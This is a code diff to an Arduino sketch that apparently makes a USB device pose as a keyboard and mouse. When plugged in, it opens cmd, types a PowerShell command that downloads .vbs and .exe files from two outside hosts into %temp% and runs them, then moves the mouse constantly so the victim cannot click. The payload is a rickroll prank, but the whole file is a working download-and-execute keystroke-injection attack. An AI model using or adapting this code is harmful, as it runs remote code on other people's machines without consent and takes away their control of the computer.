@@ -10,6 +10,7 @@
 #include "Mouse.h"
 
 void typeKey(int key) {
+  Keyboard.begin();
   Keyboard.press(key);
   delay(50);
   Keyboard.release(key);
@@ -24,9 +25,11 @@ void runPayload() {
   // Open CMD
   //typeKey(KEY_LEFT_GUI);
   Keyboard.press(KEY_LEFT_GUI);
-  Keyboard.press(R);
+  delay(5);
+  Keyboard.press('R');
+  delay(10);
   Keyboard.releaseAll();
-  Keyboard.end();
+  delay(200);
   delay(400);
   Keyboard.print("cmd");
   delay(500);
@@ -48,9 +51,9 @@ void runPayload() {
 
   // Download and run rickroll.vbs and volup.vbs and exit when done
   //audio only (harder to exit)
-  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://michaelk-f.github.io/rubber_ducky/rickroll.vbs','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/volup.vbs','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && exit");
+  Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://michaelk-f.github.io/rubber_ducky/rickroll.vbs','%temp%\\rickroll.vbs'); && start %temp%\\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/volup.vbs','%temp%\\volup.vbs'); && start %temp%\\volup.vbs && exit");
   //video - easier to exit
-  //Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://michaelk-f.github.io/rubber_ducky/rickroll.exe','%userprofile%\\rickroll.exe'); && start %userprofile%\\rickroll.exe && powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/volup.vbs','%userprofile%\\volup.vbs'); && start %userprofile%\\volup.vbs && exit");
+  //Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://michaelk-f.github.io/rubber_ducky/rickroll.exe', '%temp%\\rickroll.exe'); && start %temp%\\rickroll.exe && powershell (new-object System.Net.WebClient).DownloadFile('http://riverside.arkf.net:8080/rubber_ducky/volup.vbs','%temp%\\volup.vbs'); && start %temp%\\volup.vbs && exit");
   delay(100);
   typeKey(KEY_RETURN);
 
@@ -63,6 +66,7 @@ void setup() {
 
 void loop() {
   //Moves mouse around to annoy people and to prevent them from clicking on anything until unpluged
+  Mouse.begin();
   Mouse.move(0, 100);
   Mouse.move(0, -100);
   Mouse.move(100, 0);
